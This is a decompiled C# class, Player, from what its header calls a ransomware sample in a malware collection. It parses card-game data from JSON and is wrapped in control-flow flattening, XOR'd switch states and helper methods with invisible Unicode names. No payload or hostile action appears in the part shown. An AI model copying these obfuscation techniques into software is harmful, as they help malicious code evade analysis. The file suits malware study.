// Decompiled with JetBrains decompiler
// Type: Cytotechnologist.Player
// Assembly: StaticIndexRangePartitionForArr, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: AF5A1990-133C-4640-B616-63D01D46DEA5
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-7c7116c6a0f1e06e4c252ea45668b85c1fdf3f35216097be1208e14be4066b36.exe

using SimpleJSON;
using System.Runtime.InteropServices;

namespace Cytotechnologist
{
  public class Player
  {
    public static string MembershipCondition(int BaseStream)
    {
label_1:
      int num1 = -916501206;
      string str1;
      bool flag;
      string str2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1782099197)) % 11U)
        {
          case 1:
            str1 = (string) null;
            int num3 = BaseStream == 0 ? -1782681977 : (num3 = -59234709);
            num1 = num3 ^ (int) num2 * 800380495;
            continue;
          case 2:
            num1 = (int) num2 * -139128573 ^ 1713713491;
            continue;
          case 3:
            str1 = "4C4942464C41";
            num1 = (int) num2 * 181172561 ^ 1116131761;
            continue;
          case 4:
            str1 = "487455456D";
            num1 = (int) num2 * 460554092 ^ 863362262;
            continue;
          case 5:
            flag = BaseStream == 1;
            num1 = -281861105;
            continue;
          case 6:
            num1 = (int) num2 * 984553299 ^ -1739664017;
            continue;
          case 7:
            int num4 = flag ? -496197621 : (num4 = -1504048682);
            num1 = num4 ^ (int) num2 * 519002532;
            continue;
          case 8:
            num1 = (int) num2 * -108775649 ^ 1705772953;
            continue;
          case 9:
            str2 = str1;
            num1 = -868241982;
            continue;
          case 10:
            goto label_1;
          default:
            goto label_12;
        }
      }
label_12:
      return str2;
    }

    public string Name { get; private set; }

    private int[] PlanningCards { get; set; }

    public bool UseOneMorePlanningSprint { get; private set; }

    public int PlannedForCard(int cardTypeIndex)
    {
      if (this.PlanningCards.Length != 0)
        goto label_4;
label_1:
      int num1 = 1244244910;
label_2:
      uint num2;
      int num3;
      int num4;
      switch ((num2 = (uint) (num1 ^ 2107214914)) % 3U)
      {
        case 0:
          goto label_1;
        case 2:
          num4 = 0;
          goto label_5;
        default:
          return num3;
      }
label_4:
      num4 = this.PlanningCards[cardTypeIndex];
label_5:
      num3 = num4;
      num1 = 778970470;
      goto label_2;
    }

    public int PlanningCardsCount
    {
      get
      {
        int num1 = 0;
        int[] planningCards = this.PlanningCards;
label_1:
        int num2 = 85784701;
        bool flag;
        int index;
        int planningCardsCount;
        while (true)
        {
          uint num3;
          switch ((num3 = (uint) (num2 ^ 1295948476)) % 12U)
          {
            case 0:
              num2 = (int) num3 * -1575184765 ^ -634756909;
              continue;
            case 1:
              index = 0;
              num2 = (int) num3 * -1735435690 ^ 1119494938;
              continue;
            case 2:
              planningCardsCount = num1;
              num2 = (int) num3 * 984584516 ^ 300778783;
              continue;
            case 3:
              num2 = (int) num3 * -939281153 ^ 64130981;
              continue;
            case 5:
              flag = planningCards[index] > 0;
              num2 = 771349031;
              continue;
            case 6:
              ++index;
              num2 = (int) num3 * 1042195747 ^ 133476441;
              continue;
            case 7:
              int num4 = !flag ? -653303615 : (num4 = -1422985046);
              num2 = num4 ^ (int) num3 * -1029424664;
              continue;
            case 8:
              goto label_1;
            case 9:
              num2 = 229218018;
              continue;
            case 10:
              ++num1;
              num2 = (int) num3 * -12800699 ^ -404505825;
              continue;
            case 11:
              int num5;
              num2 = num5 = index >= planningCards.Length ? 305612018 : (num5 = 838832921);
              continue;
            default:
              goto label_13;
          }
        }
label_13:
        return planningCardsCount;
      }
    }

    private Player()
    {
    }

    public string PlanningCardsToString()
    {
label_1:
      int num1 = 1732703088;
      int index;
      int planningCard;
      bool flag;
      string str1;
      string str2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1764987620)) % 13U)
        {
          case 0:
            num1 = (int) num2 * -1976309348 ^ -1659852962;
            continue;
          case 1:
            planningCard = this.PlanningCards[index];
            flag = planningCard == 0;
            num1 = 766610775;
            continue;
          case 2:
            str1 = Player.\u206D‫‏⁫‎‫‎⁫‪⁮⁫‫‎‎⁪⁫‏‍⁯‭‏⁬‮⁮‪⁯⁪‍‏‫‪‏‪‫⁪‭⁬‏⁬‭‮(new string[5]
            {
              str1,
              Card.CardTypeNames[index],
              "x",
              planningCard.ToString(),
              " "
            });
            num1 = 1656541589;
            continue;
          case 4:
            int num3;
            num1 = num3 = index >= this.PlanningCards.Length ? 1597965334 : (num3 = 210525715);
            continue;
          case 5:
            str2 = str1;
            num1 = (int) num2 * 1809998342 ^ 139888454;
            continue;
          case 6:
            int num4 = !flag ? -470193607 : (num4 = -1632343632);
            num1 = num4 ^ (int) num2 * 99212104;
            continue;
          case 7:
            num1 = (int) num2 * 550015912 ^ 294119647;
            continue;
          case 8:
            str1 = " ";
            num1 = (int) num2 * -228615570 ^ -2132799584;
            continue;
          case 9:
            ++index;
            num1 = 83589156;
            continue;
          case 10:
            index = 0;
            num1 = (int) num2 * -986753717 ^ 1575599184;
            continue;
          case 11:
            goto label_1;
          case 12:
            num1 = (int) num2 * 11479518 ^ 1356011457;
            continue;
          default:
            goto label_14;
        }
      }
label_14:
      return str2;
    }

    public static Player Deserialize(JSONNode json) => new Player()
    {
      Name = json["name"].Value,
      PlanningCards = Player.ParsePlanningCards(json["planning-cards"]),
      UseOneMorePlanningSprint = json["use-one-more-planning-sprint"].AsBool
    };

    private static int[] ParsePlanningCards(JSONNode json)
    {
label_1:
      int num1 = -1817191729;
      int[] numArray;
      int aIndex;
      int count;
      int[] planningCards;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1788236722)) % 8U)
        {
          case 0:
            planningCards = numArray;
            num1 = (int) num2 * -1016368988 ^ -1261166472;
            continue;
          case 1:
            count = json.Count;
            numArray = new int[count];
            num1 = (int) num2 * -514134320 ^ -1103878789;
            continue;
          case 2:
            goto label_1;
          case 4:
            int num3;
            num1 = num3 = aIndex < count ? -1494339407 : (num3 = -71685314);
            continue;
          case 5:
            aIndex = 0;
            num1 = (int) num2 * 847636366 ^ -1486087372;
            continue;
          case 6:
            num1 = (int) num2 * 1770315514 ^ -128850487;
            continue;
          case 7:
            numArray[aIndex] = json[aIndex].AsInt;
            ++aIndex;
            num1 = -941027534;
            continue;
          default:
            goto label_9;
        }
      }
label_9:
      return planningCards;
    }

    public override string ToString() => Player.\u200D‪‪‌‍‬⁯⁯‏⁪⁪‍⁯‫⁪⁫⁭‏‪⁫‪‪⁮⁮‍⁯‬‪⁮​‮⁫‪⁮⁭⁮​‫‪‪‮("name: {0},\nplanning-cards: [{1}]\nuse-one-more-planning-sprint: {2}", (object) this.Name, (object) this.PlanningCardsToString(), (object) this.UseOneMorePlanningSprint);

    static string \u206D‫‏⁫‎‫‎⁫‪⁮⁫‫‎‎⁪⁫‏‍⁯‭‏⁬‮⁮‪⁯⁪‍‏‫‪‏‪‫⁪‭⁬‏⁬‭‮([In] string[] obj0) => string.Concat(obj0);

    static string \u200D‪‪‌‍‬⁯⁯‏⁪⁪‍⁯‫⁪⁫⁭‏‪⁫‪‪⁮⁮‍⁯‬‪⁮​‮⁫‪⁮⁭⁮​‫‪‪‮(
      [In] string obj0,
      [In] object obj1,
      [In] object obj2,
      [In] object obj3)
    {
      return string.Format(obj0, obj1, obj2, obj3);
    }
  }
}
